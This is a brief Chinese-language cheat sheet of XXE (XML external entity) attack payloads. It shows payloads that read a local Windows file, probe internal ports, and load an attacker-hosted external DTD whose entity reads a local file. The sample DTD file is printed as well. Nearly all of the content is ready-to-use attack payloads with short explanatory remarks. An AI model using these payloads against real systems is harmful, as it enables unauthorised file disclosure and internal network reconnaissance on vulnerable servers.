### 有回显利用

- 读文件
```xml
<?xml version= "1.0" encoding= "utf-8"?>

<!DOCTYPE xxe [

<!ELEMENT name ANY >

<!ENTITY aaa SYSTEM "file:///C:/Windows/win.ini" >]>

<name>&aaa;</name>
```

- 内网探测(探测些端口啊之类的)
```
<!ENTITY aaa SYSTEM "http://ip:port" >]>
```

- 加载外部实体(去访问dtd文件时，会把dtd文件当做xml去执行。(对方没有禁用外部实体))
```
<?xml version= "1.0"?>
<!DOCTYPE test[
<!ENTITY % dtd SYSTEM "http://ip:port/eval.dtd">（开启服务）
%dtd;
]>
<name>&send;</name>


例如：外部dtd文件
eval.dtd：
	<!ENTITY send SYSTEM "file:///C:/windows/win.ini">
```


